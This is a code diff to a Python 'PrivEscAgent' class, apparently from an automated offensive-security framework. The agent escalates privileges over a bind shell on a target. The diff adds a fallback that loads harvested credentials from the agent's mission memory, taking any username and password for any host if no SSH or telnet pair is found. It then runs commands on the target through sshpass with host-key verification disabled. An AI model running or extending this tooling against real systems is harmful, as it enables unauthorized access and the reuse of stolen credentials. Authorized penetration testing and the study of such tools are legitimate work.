@@ -157,6 +157,9 @@ class PrivEscAgent(BaseAgent):
         self._shell_socket = None
         self._socket_lock = threading.Lock()
         
+        # Credential-based access state
+        self._ssh_creds: Optional[dict] = None  # {username, password}
+        
     def _connect_shell(self, target: str, shell_port: int) -> bool:
         """Establish a persistent socket connection to the bind shell."""
         if not shell_port:
@@ -237,6 +240,14 @@ class PrivEscAgent(BaseAgent):
             f"[white]Strategy:[/] Sudo → SUID → Caps → Cron → Kernel CVEs",
             border_style="magenta",
         ))
+
+        # Load credentials from MissionMemory for SSH fallback
+        self._ssh_creds = self._load_credentials_from_memory(target)
+        if self._ssh_creds:
+            self.log_info(
+                f"Loaded SSH fallback credentials: {self._ssh_creds['username']}@{self._ssh_creds['ip']} "
+                f"(via {self._ssh_creds['service']})"
+            )
 
         try:
             # ══════════════════════════════════════════════════════════════
@@ -944,10 +955,11 @@ class PrivEscAgent(BaseAgent):
             return self._exec_shell_cmd_fallback(target, shell_port, command, timeout)
             
     def _exec_shell_cmd_fallback(self, target: str, shell_port: int, command: str, timeout: int = 15) -> str:
-        """Fallback for executing a command via a new socket connection."""
+        """Fallback for executing a command via a new socket connection or SSH."""
         import socket
         import time
         
+        # First try socket connection (for bind shells)
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.settimeout(timeout)
@@ -976,8 +988,88 @@ class PrivEscAgent(BaseAgent):
             
             return output.strip()
         except socket.timeout:
-            return ""
+            pass  # Fall through to SSH
         except Exception:
+            pass  # Fall through to SSH
+        
+        # Socket failed — try SSH with credentials if available
+        if self._ssh_creds:
+            return self._exec_via_ssh(target, command, timeout)
+        return ""
+
+    def _load_credentials_from_memory(self, target: str) -> Optional[dict]:
+        """Load SSH/telnet credentials from MissionMemory if available."""
+        try:
+            hosts = self.memory.state.get("hosts", {})
+            # Check all host IPs for credentials
+            for ip, host_data in hosts.items():
+                creds = host_data.get("credentials", [])
+                for cred in creds:
+                    service = cred.get("service", "").lower()
+                    # Prioritize SSH, then telnet, then any
+                    if service in ("ssh", "telnet") and cred.get("username") and cred.get("password"):
+                        return {
+                            "username": cred["username"],
+                            "password": cred["password"],
+                            "service": service,
+                            "ip": ip,
+                        }
+            # If no SSH/telnet, try any credential
+            for ip, host_data in hosts.items():
+                creds = host_data.get("credentials", [])
+                for cred in creds:
+                    if cred.get("username") and cred.get("password"):
+                        return {
+                            "username": cred["username"],
+                            "password": cred["password"],
+                            "service": cred.get("service", "unknown"),
+                            "ip": ip,
+                        }
+        except Exception as e:
+            self.log_warning(f"Failed to load credentials: {e}")
+        return None
+
+    def _exec_via_ssh(self, target: str, command: str, timeout: int = 15) -> str:
+        """Execute command via SSH using stored credentials."""
+        if not self._ssh_creds:
+            return ""
+        
+        try:
+            # Use sshpass for non-interactive password auth
+            user = self._ssh_creds["username"]
+            pwd = self._ssh_creds["password"]
+            
+            # Escape special chars in command
+            escaped_cmd = command.replace("'", "'\\''")
+            
+            result = subprocess.run(
+                [
+                    "sshpass", "-p", pwd,
+                    "ssh", "-o", "StrictHostKeyChecking=no",
+                    "-o", "UserKnownHostsFile=/dev/null",
+                    "-o", "ConnectTimeout=10",
+                    "-o", "BatchMode=no",
+                    f"{user}@{target}",
+                    escaped_cmd,
+                ],
+                capture_output=True,
+                text=True,
+                timeout=timeout,
+            )
+            
+            output = result.stdout.strip()
+            if result.returncode == 0 and output:
+                self._verbose_shell_output(output[:500])
+                return output
+            return ""
+        except subprocess.TimeoutExpired:
+            self.log_warning(f"SSH command timed out: {command[:50]}")
+            return ""
+        except FileNotFoundError:
+            self.log_warning("sshpass not installed - cannot use credential-based access")
+            return ""
+        except Exception as e:
+            self.log_warning(f"SSH execution failed: {e}")
             return ""
 
     # ══════════════════════════════════════════════════════════════════════════
